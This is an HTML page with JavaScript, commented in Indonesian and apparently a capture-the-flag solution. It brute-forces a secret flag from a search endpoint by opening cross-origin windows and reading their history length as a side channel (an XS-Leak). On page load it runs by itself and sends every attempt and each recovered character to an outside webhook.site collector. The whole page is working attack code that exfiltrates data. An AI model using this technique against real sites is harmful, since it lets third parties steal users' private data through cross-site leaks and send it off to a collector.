<!DOCTYPE html>
<html>
<body>
    <script>
        // Gunakan http:// jika https:// bermasalah dengan sertifikat
        const targetBase = "http://ponder.cbd2026.cloud/search?q=";
        const webhook = "https://webhook.site/76c1a3f4-7985-4c73-9f7d-1d28bae13e25"; 
        
        // COBA VARIASI: Jika "flag{" gagal, coba "{" atau langsung mulai brute force
        let flag = "flag{"; 
        const alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}";

        fetch(`${webhook}?status=ULTRADEBUG_START&prefix=${flag}`);

        async function tryChar(char) {
            return new Promise((resolve) => {
                const query = flag + char;
                const win = window.open(`${targetBase}${encodeURIComponent(query)}`);

                setTimeout(() => {
                    if (!win) {
                        fetch(`${webhook}?error=POPUP_BLOCKED`);
                        resolve(false);
                        return;
                    }

                    try {
                        const hLen = win.history.length;
                        win.close();
                        
                        // LOG SEMUA PERCOBAAN: Cek di Webhook apakah ada yang h_len=2
                        fetch(`${webhook}?try=${encodeURIComponent(query)}&h=${hLen}`);

                        if (hLen > 1) {
                            resolve(true);
                        } else {
                            resolve(false);
                        }
                    } catch (e) {
                        win.close();
                        resolve(false);
                    }
                }, 3000); // Naikkan jeda ke 3 detik untuk kestabilan
            });
        }

        async function run() {
            for (let char of alphabet) {
                if (await tryChar(char)) {
                    flag += char;
                    fetch(`${webhook}?FOUND_FLAG=${encodeURIComponent(flag)}`);
                    if (char === "}") return;
                    return run();
                }
            }
            fetch(`${webhook}?status=FAILED_ROUND&last_tried=${flag}`);
        }

        window.onload = run;
    </script>
</body>
</html>
